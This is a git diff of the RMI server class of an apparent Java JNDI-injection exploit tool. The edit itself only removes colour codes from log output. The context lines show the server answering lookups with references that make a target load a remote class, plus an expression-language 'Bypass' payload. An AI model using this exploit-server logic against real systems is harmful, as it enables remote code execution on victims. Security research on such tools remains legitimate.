@@ -92,7 +92,7 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         String url = "http://" + Config.ip + ":" + Config.rmiPort;
 
         try {
-            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RMI  Server Start Listening on >> |@" + Config.rmiPort + "..."));
+            System.out.println(ansi().render("@|green [+]|@RMI  Server Start Listening on >>" + Config.rmiPort + "..."));
             RMIServer c = new RMIServer(Config.rmiPort, new URL(url));
             c.run();
         } catch (Exception e) {
@@ -258,8 +258,7 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         }
 
         String object = (String) ois.readObject();
-        System.out.println(ansi().render("@|green [+]|@" + " [" + Ltime.getLocalTime() + "]" + " [RMI] " + "@|BG_green -----------------------------------------------------------------------------------------------------|@"));
-        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RMI  服务器  >> RMI 查询 |@" + object + " " + method));
+        System.out.println(ansi().render("@|green [+]|@RMI  服务器  >> RMI 查询" + object + " " + method));
         out.writeByte(TransportConstants.Return); // transport op
         try (ObjectOutputStream oos = new MarshalOutputStream(out, this.classpathUrl)) {
 
@@ -270,10 +269,10 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
             ReferenceWrapper rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);
 
             if (object.startsWith("Bypass")) {
-                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RMI  服务器  >> 发送本地类加载引用|@"));
+                System.out.println(ansi().render("@|green [+]|@RMI  服务器  >> 发送本地类加载引用"));
                 Reflections.setFieldValue(rw, "wrappee", execByEL());
             } else {
-                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RMI  服务器  >> 向目标发送 stub >>|@ %s", new URL(this.classpathUrl, this.classpathUrl.getRef().replace('.', '/').concat(".class"))));
+                System.out.println(ansi().render("@|green [+]|@RMI  服务器  >> 向目标发送 stub >> %s", new URL(this.classpathUrl, this.classpathUrl.getRef().replace('.', '/').concat(".class"))));
                 Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", this.classpathUrl.getRef(), this.classpathUrl.toString()));
             }
 
